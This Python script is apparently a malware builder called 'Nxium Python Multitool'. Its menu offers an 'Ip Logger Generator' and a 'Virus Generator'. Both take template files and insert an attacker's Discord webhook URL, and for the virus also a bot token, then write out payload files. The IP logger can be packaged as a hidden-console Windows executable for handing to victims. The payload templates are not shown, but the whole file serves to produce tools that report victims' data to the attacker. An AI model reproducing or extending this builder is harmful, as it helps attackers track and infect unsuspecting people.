import os
import sys
import re
import subprocess
import shutil
from typing import Optional
from colorama import Fore, Style, init

init(autoreset=True)

TEMPLATE_FILE = "template.py"
VIRUS_TEMP = "virus.py"
VIRUS_OUTPUT = "virusDONTOPEN.py"
OUTPUT_FILE = "iplogger.py"
BLUE = "\033[94m"
RESET = "\033[0m"
BANNER = f"""{Fore.BLUE}
   _   _      _                   __  __       _ _   _   _______          _ 
 | \ | |    (_)                 |  \/  |     | | | (_) |__   __|        | |
 |  \| |_  ___ _   _ _ __ ___   | \  / |_   _| | |_ _     | | ___   ___ | |
 | . ` \ \/ / | | | | '_ ` _ \  | |\/| | | | | | __| |    | |/ _ \ / _ \| |
 | |\  |>  <| | |_| | | | | | | | |  | | |_| | | |_| |    | | (_) | (_) | |
 |_| \_/_/\_\_|\__,_|_| |_| |_| |_|  |_|\__,_|_|\__|_|    |_|\___/ \___/|_|
                                                                           
                                                                           
{Style.RESET_ALL}"""

def clear():
    os.system("cls" if os.name == "nt" else "clear")


def _run(cmd, cwd=None):
    return subprocess.run(cmd, cwd=cwd, check=False, capture_output=True, text=True)


def ensure_pyinstaller():
    """
    Ensure PyInstaller is available. Attempts to detect it and optionally install it.
    Returns True if available/installed successfully, else False.
    """
    # Check if the CLI exists first
    if shutil.which("pyinstaller"):
        return True

    # Try module invocation to see if it's already present
    probe = _run([sys.executable, "-m", "PyInstaller", "--version"])  # note: module name is case-sensitive
    if probe.returncode == 0:
        return True

    print("PyInstaller not found. It is required to build an exe.")
    choice = input("Install PyInstaller now using pip? [Y/n]: ").strip().lower()
    if choice in ("", "y", "yes"):
        print("Installing PyInstaller...")
        proc = _run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])  # upgrade pip first
        if proc.returncode != 0:
            # Continue even if pip upgrade fails
            pass
        install = _run([sys.executable, "-m", "pip", "install", "pyinstaller"]) 
        if install.returncode == 0:
            print("PyInstaller installed successfully.")
            return True
        else:
            print("Failed to install PyInstaller. stderr:\n" + (install.stderr or ""))
            return False
    else:
        print("Cannot build exe without PyInstaller.")
        return False


def build_exe(script_path: str) -> Optional[str]:
    """
    Build a standalone exe from the given Python script using PyInstaller.
    Returns the absolute path to the resulting exe if successful, else None.
    """
    if not ensure_pyinstaller():
        return None

    script_abs = os.path.abspath(script_path)
    base = os.path.splitext(os.path.basename(script_abs))[0]

    print("Building exe, this may take a moment...")
    # Prefer module invocation to avoid PATH issues
    proc = _run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", script_abs], cwd=os.path.dirname(script_abs))

    if proc.returncode != 0:
        print("PyInstaller failed. stdout:\n" + (proc.stdout or ""))
        print("stderr:\n" + (proc.stderr or ""))
        return None

    dist_dir = os.path.join(os.path.dirname(script_abs), "dist")
    built_exe = os.path.join(dist_dir, f"{base}.exe")

    if not os.path.exists(built_exe):
        # Sometimes the name may differ on non-Windows, but we expect .exe here
        print("Build completed but the expected exe was not found:", built_exe)
        return None

    # Copy/move the exe to project root with a predictable name
    final_exe = os.path.abspath(os.path.join(os.path.dirname(script_abs), f"{base}.exe"))

    try:
        # Overwrite if exists
        if os.path.exists(final_exe):
            os.remove(final_exe)
        shutil.copy2(built_exe, final_exe)
    except Exception as e:
        print("Failed to place exe in project root:", e)
        print("You can find the executable in:", built_exe)
        return built_exe

    # Optional cleanup (keep dist/ by default to avoid re-build cost)
    spec_file = os.path.join(os.path.dirname(script_abs), f"{base}.spec")
    build_dir = os.path.join(os.path.dirname(script_abs), "build")
    try:
        if os.path.exists(spec_file):
            os.remove(spec_file)
        if os.path.isdir(build_dir):
            shutil.rmtree(build_dir, ignore_errors=True)
    except Exception:
        pass

    return final_exe

def virus_generator():
    print("Virus Generator")
    if not os.path.exists(VIRUS_TEMP):
        print(f"Template file '{VIRUS_TEMP}' not found.")
        return

    user_value = input(
        "whats the discord webhook? (go to discord make a new server then go to server settings then go to integrations then go to create webhook then copy webhook link then paste it here): "
    ).strip()

    with open(VIRUS_TEMP, "r", encoding="utf-8") as f:
        content = f.read()

    # Replace only the value inside WEBHOOK_URL = "..."
    pattern = r'WEBHOOK_URL\s*=\s*".*?"'
    replacement = f'WEBHOOK_URL = "{user_value}"'
    new_content = re.sub(pattern, replacement, content)

    token_value = input("whats the token? (go to discord go to user settings then go to advanced then turn on developer mode then search up discord developer dashboard and create a new application then copy the token and paste it here): ").strip()
    token_pattern = r'TOKEN\s*=\s*".*?"'
    token_replacement = f'TOKEN = "{token_value}"'
    token_new_content = re.sub(token_pattern, token_replacement, new_content)

    with open(VIRUS_OUTPUT, "w", encoding="utf-8") as f:
        f.write(token_new_content)

    print(f"Virus file created at: {VIRUS_OUTPUT}")


def file_generation():
    if not os.path.exists(TEMPLATE_FILE):
        print(f"Template file '{TEMPLATE_FILE}' not found.")
        return

    user_value = input(
        "whats the discord webhook? (go to discord make a new server then go to server settings then go to integrations then go to create webhook then copy webhook link then paste it here): "
    ).strip()

    with open(TEMPLATE_FILE, "r", encoding="utf-8") as f:
        content = f.read()

    # Replace only the value inside WEBHOOK_URL = "..."
    pattern = r'WEBHOOK_URL\s*=\s*".*?"'
    replacement = f'WEBHOOK_URL = "{user_value}"'
    new_content = re.sub(pattern, replacement, content)

    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        f.write(new_content)

    full_py_path = os.path.abspath(OUTPUT_FILE)

    # Ask desired output format
    while True:
        out_choice = input("Output format? type 'py' for Python file or 'exe' for Windows executable [py/exe]: ").strip().lower()
        if out_choice in ("py", "exe"):
            break
        print("Please enter 'py' or 'exe'.")

    if out_choice == "py":
        print(f"\nPython file successfully created at:\n{full_py_path}\n")
        return

    # Build exe
    exe_path = build_exe(OUTPUT_FILE)
    if exe_path:
        print(f"\nExecutable successfully created at:\n{exe_path}\n")
    else:
        print("Failed to create executable. The Python file is still available at:")
        print(full_py_path)


def main():
    while True:
        print(BANNER)
        print("==== Nxium Python Multitool ====\n1. Close\n2. Ip Logger Generator\n3. Virus Generator")
        choice = input("Select an option: ").strip()

        if choice == "2":
            file_generation()
        elif choice == "1":
            print("Closing multitool...")
            sys.exit()
        elif choice == "3":
            virus_generator()
        else:
            print("Invalid option.\n")


if __name__ == "__main__":
    main()
